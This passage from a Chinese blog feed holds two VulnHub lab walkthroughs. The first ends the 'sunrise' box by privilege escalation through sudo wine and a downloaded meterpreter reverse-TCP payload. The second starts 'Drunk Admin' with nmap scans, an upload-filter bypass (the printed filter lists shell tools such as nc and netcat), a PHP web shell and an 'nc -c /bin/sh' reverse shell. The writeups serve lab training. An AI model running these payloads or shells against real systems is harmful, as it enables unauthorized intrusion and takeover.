<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@sunrise:/home/weborf<span class="comment"># cd /root</span></span><br><span class="line">root@sunrise:~<span class="comment"># ls</span></span><br><span class="line">Desktop  Documents  Downloads  Groups  Logs  Manual  Music  Pictures  Public  Readme  root.txt  Templates  Users  Videos</span><br><span class="line">root@sunrise:~<span class="comment"># cat root.txt</span></span><br><span class="line">            ^^                   @@@@@@@@@</span><br><span class="line">       ^^       ^^            @@@@@@@@@@@@@@@</span><br><span class="line">                            @@@@@@@@@@@@@@@@@@              ^^</span><br><span class="line">                           @@@@@@@@@@@@@@@@@@@@</span><br><span class="line"> ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; ~~~~~~~ ~~~~~~~~~~~ ~~~</span><br><span class="line"> ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~</span><br><span class="line">   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~</span><br><span class="line">   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~</span><br><span class="line"> ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~</span><br><span class="line">       ~             ~        ~      ~      ~~   ~             ~</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)</span><br><span class="line"></span><br><span class="line">24edb59d21c273c033aa6f1689b0b18c</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub101.jpg"></p>
<p><font color="red">What a beautiful sunrise!!!</font></p>
<h3 id="Other-way"><a href="#Other-way" class="headerlink" title="Other way"></a>Other way</h3><p>如果root的hash值解密不出来，还可以使用sunrise/thefutureissobrightigottawearshades登录，然后提权，密码拆开正常排序发现是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">the future is so bright i gotta wear shades</span><br><span class="line">(未来是如此光明，以至于我必须戴上墨镜)</span><br></pre></td></tr></table></figure>

<p>成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weborf@sunrise:~$ su sunrise                                                                                                                                                                                                               </span><br><span class="line">Password:                                                                                                                                                                                                                                  </span><br><span class="line">sunrise@sunrise:/home/weborf$ id                                                                                                                                                                                                           </span><br><span class="line">uid=1000(sunrise) gid=1000(sunrise) groups=1000(sunrise),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)                                                                 </span><br><span class="line">sunrise@sunrise:/home/weborf$ whoami                                                                                                                                                                                                       </span><br><span class="line">sunrise</span><br></pre></td></tr></table></figure>

<p>下面是提权进程，基本不需要各种提权脚本，手动更快更准</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunrise@sunrise:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> sunrise:                                                                                                                                                                                                               </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> sunrise on sunrise:                                                                                                                                                                                          </span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                                                                 </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">User sunrise may run the following commands on sunrise:                                                                                                                                                                                    </span><br><span class="line">    (root) /usr/bin/wine</span><br><span class="line"></span><br><span class="line">sunrise@sunrise:~$ <span class="built_in">cd</span> /tmp</span><br></pre></td></tr></table></figure>

<p>Wine（Wine不是模拟器的递归反义词）是一个免费的开放源代码兼容性层，旨在使为Microsoft Windows开发的计算机程序（应用程序软件和计算机游戏）能够在类似Unix的操作系统上运行。</p>
<p>可以以root身份运行wine，创建可以使用wine执行的payload。 使用msfpc进行payload创建。 创建payload后，将运行python一个liner将payload传输到目标计算机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfpc windows 192.168.56.102</span></span><br><span class="line"> [*] MSFvenom Payload Creator (MSFPC v1.4.5)</span><br><span class="line"> [i]   IP: 192.168.56.102</span><br><span class="line"> [i] PORT: 443</span><br><span class="line"> [i] TYPE: windows (windows/meterpreter/reverse_tcp)</span><br><span class="line"> [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \</span><br><span class="line">  --platform windows -a x86 -e generic/none LHOST=192.168.56.102 LPORT=443 \</span><br><span class="line">  &gt; <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> [i] windows meterpreter created: <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"> [i] MSF handler file: <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc&#x27;</span></span><br><span class="line"> [i] Run: msfconsole -q -r <span class="string">&#x27;/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc&#x27;</span></span><br><span class="line"> [?] Quick web server (<span class="keyword">for</span> file transfer)?: python2 -m SimpleHTTPServer 8080</span><br><span class="line"> [*] Done!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>将payload托管在攻击者的计算机上，使用wget工具将所述文件下载到目标计算机。 成功将payload传输到目标计算机之后，使用wine和sudo执行有效负载。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunrise@sunrise:/tmp$ wget http://192.168.56.102:8000/windows-meterpreter-staged-reverse-tcp-443.exe</span><br><span class="line">--2019-12-25 04:29:12--  http://192.168.56.102:8000/windows-meterpreter-staged-reverse-tcp-443.exe</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 73802 (72K) [application/x-msdos-program]</span><br><span class="line">Saving to: ‘windows-meterpreter-staged-reverse-tcp-443.exe’</span><br><span class="line"></span><br><span class="line">windows-meterpreter-staged-reverse-tcp-443.exe             100%[=======================================================================================================================================&gt;]  72.07K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2019-12-25 04:29:12 (439 MB/s) - ‘windows-meterpreter-staged-reverse-tcp-443.exe’ saved [73802/73802]</span><br><span class="line"></span><br><span class="line">sunrise@sunrise:/tmp$ sudo wine windows-meterpreter-staged-reverse-tcp-443.exe</span><br><span class="line">[sudo] password <span class="keyword">for</span> sunrise: </span><br></pre></td></tr></table></figure>

<p>使用msfpc工具生成payload时，还将运行payload侦听器所需的配置来生成Metasploit Framework ruby文件。 运行了该ruby文件，在该目标计算机上使用wine运行该文件时。 看到一个session弹出。 由于该文件是使用具有root特权shell的wine执行的，因此我们也获得了root权限。 遍历到根目录，当列出该目录中的所有文件时，找到root.txt的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole -q -r &#x27;/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc&#x27;                                                                                                                                                    </span></span><br><span class="line">[*] Processing /root/windows-meterpreter-staged-reverse-tcp-443-exe.rc <span class="keyword">for</span> ERB directives.                                                                                                                                                 </span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; use exploit/multi/handler                                                                                                                                              </span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp                                                                                                                            </span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp                                                                                                                                                                                                 </span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> LHOST 192.168.56.102                                                                                                                                               </span><br><span class="line">LHOST =&gt; 192.168.56.102</span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">ExitOnSession =&gt; <span class="literal">false</span></span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">resource (/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)&gt; run -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.102:443 </span><br><span class="line">msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai</span><br><span class="line">[*] Sending encoded stage (180320 bytes) to 192.168.56.104</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.102:443 -&gt; 192.168.56.104:44876) at 2019-12-25 04:37:04 -0500</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: whoami.</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: sunrise\root</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">Z:\tmp</span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> /root</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: Z:\root</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  1602  fil   2019-12-05 17:24:31 -0500  .ICEauthority</span><br><span class="line">100666/rw-rw-rw-  104   fil   2019-12-05 17:40:27 -0500  .Xauthority</span><br><span class="line">100666/rw-rw-rw-  142   fil   2019-12-25 04:07:46 -0500  .bash_history</span><br><span class="line">100666/rw-rw-rw-  570   fil   2010-01-31 06:52:26 -0500  .bashrc</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 17:46:24 -0500  .cache</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:48:21 -0500  .config</span><br><span class="line">100666/rw-rw-rw-  35    fil   2019-12-04 15:46:34 -0500  .dmrc</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:48:12 -0500  .gnupg</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 14:29:33 -0500  .<span class="built_in">local</span></span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 17:46:29 -0500  .mozilla</span><br><span class="line">100666/rw-rw-rw-  0     fil   2019-12-04 16:56:11 -0500  .odbc.ini</span><br><span class="line">100666/rw-rw-rw-  148   fil   2015-08-17 11:30:33 -0400  .profile</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 14:48:28 -0500  .rpmdb</span><br><span class="line">100666/rw-rw-rw-  66    fil   2019-12-05 16:08:41 -0500  .selected_editor</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:47:54 -0500  .ssh</span><br><span class="line">100666/rw-rw-rw-  252   fil   2019-12-05 14:59:00 -0500  .wget-hsts</span><br><span class="line">100666/rw-rw-rw-  2211  fil   2019-12-05 17:24:30 -0500  .xsession-errors</span><br><span class="line">100666/rw-rw-rw-  2211  fil   2019-12-05 13:51:40 -0500  .xsession-errors.old</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Desktop</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Documents</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Downloads</span><br><span class="line">40777/rwxrwxrwx   0     dir   2007-08-29 11:03:27 -0400  Groups</span><br><span class="line">40777/rwxrwxrwx   0     dir   2007-08-29 11:03:27 -0400  Logs</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 16:33:15 -0500  Manual</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Music</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Pictures</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Public</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 16:33:15 -0500  Readme</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Templates</span><br><span class="line">40777/rwxrwxrwx   0     dir   2007-08-29 11:03:26 -0400  Users</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-04 15:46:51 -0500  Videos</span><br><span class="line">100666/rw-rw-rw-  701   fil   2019-12-05 17:22:55 -0500  root.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat root.txt</span><br><span class="line">            ^^                   @@@@@@@@@</span><br><span class="line">       ^^       ^^            @@@@@@@@@@@@@@@</span><br><span class="line">                            @@@@@@@@@@@@@@@@@@              ^^</span><br><span class="line">                           @@@@@@@@@@@@@@@@@@@@</span><br><span class="line"> ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; ~~~~~~~ ~~~~~~~~~~~ ~~~</span><br><span class="line"> ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~</span><br><span class="line">   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~</span><br><span class="line">   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~</span><br><span class="line"> ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~</span><br><span class="line">       ~             ~        ~      ~      ~~   ~             ~</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)</span><br><span class="line"></span><br><span class="line">24edb59d21c273c033aa6f1689b0b18c</span><br></pre></td></tr></table></figure>

<p><font color="green">帅掉渣！！！还有更多方法请通过qq告诉我，我的qq:1185151867</font></p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Drunk-Admin-Web-Hacking-Challenge-1]</title>
    <url>/2019/12/08/vulnhub-Drunk-Admin-Web-Hacking-Challenge-1/</url>
    <content><![CDATA[<h3 id="靶机镜像下载-drunk-admin-hacking-challenge-zip"><a href="#靶机镜像下载-drunk-admin-hacking-challenge-zip" class="headerlink" title="靶机镜像下载(drunk_admin_hacking_challenge.zip)"></a>靶机镜像下载(drunk_admin_hacking_challenge.zip)</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL2JlY2h0c291ZGlzLmNvbS9kYXRhL2NoYWxsZW5nZXMvZHJ1bmtfYWRtaW5faGFja2luZ19jaGFsbGVuZ2Uuemlw">http://bechtsoudis.com/data/challenges/drunk_admin_hacking_challenge.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kcnVua2FkbWluaGFja2luZ2NoYWxsZW5nZS9kcnVua19hZG1pbl9oYWNraW5nX2NoYWxsZW5nZS56aXA=">https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9kcnVua2FkbWluaGFja2luZ2NoYWxsZW5nZS9kcnVua19hZG1pbl9oYWNraW5nX2NoYWxsZW5nZS56aXAudG9ycmVudA==">https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
<li>发布日期：2012年4月2日</li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>默认情况下，将网络配置为通过DHCP获取IP地址。 虽然如果您想进一步配置虚拟机，则可以以用户root和密码toor登录。 apache Web服务器配置为在端口8880上运行。</p>
<p>挑战包括具有各种设计漏洞的图像托管Web服务。 您必须枚举各种Web服务功能并找到可利用的漏洞才能读取系统隐藏文件。 该网络应用程序是100％自定义的，因此请勿尝试在Google中搜索相对的PoC攻击代码。</p>
<p>最终目标：显示隐藏的消息，以安排Bob发送给Alice的日期。</p>
<h3 id="虚拟机网络配置"><a href="#虚拟机网络配置" class="headerlink" title="虚拟机网络配置"></a>虚拟机网络配置</h3><p>将虚拟靶机和kali攻击机的vmware网络都配置成[自定义：特定虚拟网络的&lt;VMnet8(NAT模式)&gt;]即可。</p>
<h3 id="主机发现与信息收集"><a href="#主机发现与信息收集" class="headerlink" title="主机发现与信息收集"></a>主机发现与信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub14.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 192.168.84.138 -p 1-65535</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub15.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -Pn -T4 -sV -v --script=vuln 192.168.84.138 -p 22,8880</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub16.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub17.jpg"></p>
<p>可以看到是一个文件上传页面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub18.jpg"></p>
<h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>首先上传正常图片，抓包，观察返回包，发现其中Set-Cookie: trypios的值和图片的前缀一致<br>之后成功上传php文件后也可以借鉴此hash路径。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub19.jpg"></p>
<p>将后缀改成.jpg.php后发现成功上传，再将body中的图片内容改成普通的php木马，如下图所示被识别。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub20.jpg"></p>
<p>图中是蚁剑base64加密的木马，可以发现被拦截了。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub21.jpg"></p>
<p>如下图自己构造php payload读取upload.php文件内容，看看过滤了什么，如下图。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;../upload.php&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub22.jpg"></p>
<p>右键查看源码，发现过滤了如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define (<span class="string">&quot;MAX_SIZE&quot;</span>,<span class="string">&quot;500&quot;</span>);</span><br><span class="line"><span class="variable">$raw_name</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> getExtension(<span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="variable">$i</span> = strrpos(<span class="variable">$str</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$i</span>) &#123; <span class="built_in">return</span> <span class="string">&quot;&quot;</span>; &#125;</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$str</span>) - <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$ext</span> = substr(<span class="variable">$str</span>,<span class="variable">$i</span>+1,<span class="variable">$l</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$ext</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$errors</span>=0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;Submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$image</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$image</span>) &#123;</span><br><span class="line">     <span class="variable">$filename</span> = stripslashes(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = getExtension(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$extension</span> = strtolower(<span class="variable">$extension</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^.*\.(bmp|jpeg|gif|png|jpg).*$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$size</span>=filesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$size</span> &gt; MAX_SIZE*1024) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;You have exceeded the size limit!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$errors</span>=1;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="variable">$raw_name</span>=md5(<span class="variable">$image</span>);</span><br><span class="line">        <span class="variable">$image_name</span>=md5(<span class="variable">$image</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            <span class="variable">$newname</span>=<span class="string">&quot;images/&quot;</span>.<span class="variable">$image_name</span>;</span><br><span class="line">            <span class="variable">$copied</span> = copy(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$newname</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$copied</span>) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;Copy unsuccessful!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$errors</span>=1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;Invalid file extension!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$errors</span>=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;No image selected. Be carefull next time!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$errors</span>=1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;h1&gt;No data? Come on give me something to play with!&lt;/h1&gt;&#x27;</span>; </span><br><span class="line">    <span class="variable">$errors</span>=1; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;Submit&#x27;</span>]) &amp;&amp; !<span class="variable">$errors</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="string">&quot;./images/<span class="variable">$image_name</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( strpos(<span class="variable">$file</span>,<span class="string">&quot;perl&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;bash&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;sh -c&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;python&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;nc &quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;netcat&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;base64&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;ruby&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;fsockopen&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;xterm&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&quot;gcc&quot;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_GET&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_POST&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_SERVER&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_FILES&#x27;</span>) ||</span><br><span class="line">    strpos(<span class="variable">$file</span>,<span class="string">&#x27;$_COOKIE&#x27;</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;&quot;</span>; </span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&quot;rm ./images/<span class="variable">$image_name</span>&quot;</span>);</span><br><span class="line">    die;</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">&quot;trypios&quot;</span>, <span class="string">&quot;<span class="variable">$raw_name</span>&quot;</span>, time()+3600);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt; window.location = &quot;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>].<span class="string">&quot;:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>].<span class="string">&#x27;/image.php&quot; &lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub23.jpg"></p>
<p>知道了过滤了什么，就知道如何构造木马，如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">exec</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub24.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub25.jpg"></p>
<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>浏览器执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.84.138:8880/images/a361463fc252b94026673a556a177ee7?cmd=nc -c /bin/sh 192.168.84.135 4444</span><br></pre></td></tr></table></figure>

<p>kali攻击机执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub26.jpg"></p>
